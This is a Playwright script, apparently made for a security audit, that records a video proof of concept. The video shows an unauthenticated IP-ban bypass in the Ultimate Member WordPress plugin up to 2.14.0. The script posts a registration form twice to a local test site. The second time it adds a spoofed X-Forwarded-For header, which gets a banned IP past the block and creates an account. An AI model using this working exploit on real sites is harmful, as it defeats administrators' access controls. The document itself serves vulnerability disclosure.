// PoC Video — Finding #2: Ultimate Member <= 2.14.0 — IP Ban Bypass via X-Forwarded-For (Unauth)
// Génère poc-2-um-ip-ban-bypass (1920x1080, ~37s) — étapes: titre → ban configuré → test 1 SANS header (bloqué) → test 2 AVEC XFF (bypassé, compte créé) → après
// Prérequis: env de test, admin a configuré Block IPs = 127.0.0.1 (option blocked_ips)
const { chromium } = require('playwright');

(async () => {
  const browser = await chromium.launch({args:['--no-sandbox']});
  const context = await browser.newContext({ viewport: { width: 1920, height: 1080 }, recordVideo: { dir: './videos/', size: { width: 1920, height: 1080 } } });
  const page = await context.newPage();

  await page.setContent(`<html><body style="background:#1a1a2e;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh">
    <div style="text-align:center">
    <h1 style="color:#e94560">Ultimate Member <= 2.14.0</h1>
    <h2>CWE-348 — IP Ban Bypass (X-Forwarded-For) — Unauthenticated</h2>
    <p>Blocked IPs list bypassed via spoofed client-controlled header</p>
    </div></body></html>`);
  await page.waitForTimeout(6000);

  await page.goto('http://127.0.0.1/?page_id=13', { waitUntil: 'domcontentloaded' });
  await page.evaluate(() => { const b = document.createElement('div'); b.style.cssText='position:fixed;top:10px;left:10px;background:#e94560;color:#fff;padding:8px 16px;z-index:9999;font-family:monospace'; b.textContent = 'BEFORE: admin has banned 127.0.0.1 (Block IPs setting). Visitor IP = 127.0.0.1'; document.body.appendChild(b); });
  await page.waitForTimeout(3500);

  const nonce = await page.evaluate(() => document.querySelector('input[name="_wpnonce"]')?.value || '');

  // Test 1: SANS header → bloqué
  await page.evaluate(async (nonce) => {
    const body = new URLSearchParams({
      form_id: '7', _wpnonce: nonce,
      'user_login-7': 'bypassvid1', 'first_name-7': 'T', 'last_name-7': 'U',
      'user_email-7': 'bypassvid1@audit.local', 'user_password-7': 'VidPass12345!x', 'confirm_user_password-7': 'VidPass12345!x',
    });
    const r = await fetch('/?page_id=13', { method: 'POST', body, redirect: 'manual' });
    const loc = r.headers.get('location') || r.url || String(r.status);
    const b = document.createElement('div'); b.style.cssText='position:fixed;bottom:50px;left:10px;background:#000;color:#e94560;padding:10px;z-index:9999;font-family:monospace;white-space:pre-wrap;max-width:90%';
    b.textContent = 'TEST 1 (no header): ' + (loc.includes('blocked_ip') ? 'BLOCKED — err=blocked_ip (ban works)' : loc); document.body.appendChild(b);
  }, nonce);
  await page.waitForTimeout(6000);

  // Test 2: AVEC X-Forwarded-For → bypass
  await page.evaluate(async (nonce) => {
    const body = new URLSearchParams({
      form_id: '7', _wpnonce: nonce,
      'user_login-7': 'bypassvid2', 'first_name-7': 'T', 'last_name-7': 'U',
      'user_email-7': 'bypassvid2@audit.local', 'user_password-7': 'VidPass12345!x', 'confirm_user_password-7': 'VidPass12345!x',
    });
    const r = await fetch('/?page_id=13', { method: 'POST', body, redirect: 'manual', headers: { 'X-Forwarded-For': '8.8.8.8' } });
    const loc = r.headers.get('location') || r.url || String(r.status);
    const b = document.createElement('div'); b.style.cssText='position:fixed;bottom:50px;left:10px;background:#000;color:#0f0;padding:10px;z-index:9999;font-family:monospace;white-space:pre-wrap;max-width:90%';
    b.textContent = 'TEST 2 (X-Forwarded-For: 8.8.8.8): ' + (loc.includes('um_user') ? 'BYPASSED! Redirect: ' + loc + ' — account created from BANNED IP' : loc); document.body.appendChild(b);
  }, nonce);
  await page.waitForTimeout(8000);

  // Après
  await page.evaluate(() => { const b = document.createElement('div'); b.style.cssText='position:fixed;top:10px;left:10px;background:#0f0;color:#000;padding:8px 16px;z-index:9999;font-family:monospace'; b.textContent = 'AFTER: user bypassvid2 exists despite IP ban — um_user_ip() trusts XFF/Client-IP before REMOTE_ADDR'; document.body.appendChild(b); });
  await page.waitForTimeout(6000);

  await context.close();
  await browser.close();
})();
